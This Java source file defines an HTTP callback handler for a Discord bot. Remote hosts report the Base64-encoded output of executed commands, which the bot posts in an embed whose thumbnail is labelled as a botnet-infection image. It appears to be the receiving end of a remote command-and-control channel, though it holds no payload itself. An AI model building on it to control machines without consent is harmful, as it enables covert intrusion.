package io.github.glowman554.nudel.exs;

import io.github.glowman554.nudel.httpapi.HttpApiHandler;
import net.dv8tion.jda.api.EmbedBuilder;

import java.util.Base64;
import java.util.Map;

public class ExsCallbackHandler implements HttpApiHandler
{
    private final Exs exs;

    public ExsCallbackHandler(Exs exs)
    {
        this.exs = exs;
    }

    @Override
    public String execute(Map<String, String> query) throws Exception
    {
        String ip = query.get("ip");
        String callback_id = query.get("cid");

        if (callback_id == null)
        {
            return "{\"msg\": \"missing cid\"}";
        }

        String text = query.get("text");
        if (text != null)
        {
            text = new String(Base64.getDecoder().decode(text));
        }
        else
        {
            text = String.format("%s completed command with callback id %s!", ip, callback_id);
        }

        if (exs.command_callback_buffer.get(ip) != null)
        {
            if (exs.command_callback_buffer.get(ip).equals(callback_id))
            {
                if (exs.last_command != null)
                {
                    EmbedBuilder eb = new EmbedBuilder();
                    eb.setTitle("Command callback");
                    eb.setDescription(String.format("```\n%s\n```", text));
                    eb.setThumbnail("https://img.myloview.de/fototapeten/botnet-infektion-warnzeichen-grunge-stil-vektor-illustration-400-36198642.jpg");
                    eb.setAuthor(ip);
                    exs.last_command.sendMessage(eb.build()).queue();

                    exs.command_callback_buffer.remove(ip);

                    return "{\"msg\": \"it do be working!\"}";
                }
                else
                {
                    System.out.println(text);
                    return "{\"msg\": \"it do be working!\"}";
                }
            }
            else
            {
                return "{\"msg\": \"unexpected callback\"}";
            }
        }
        else
        {
            return "{\"msg\": \"unexpected callback\"}";
        }
    }
}
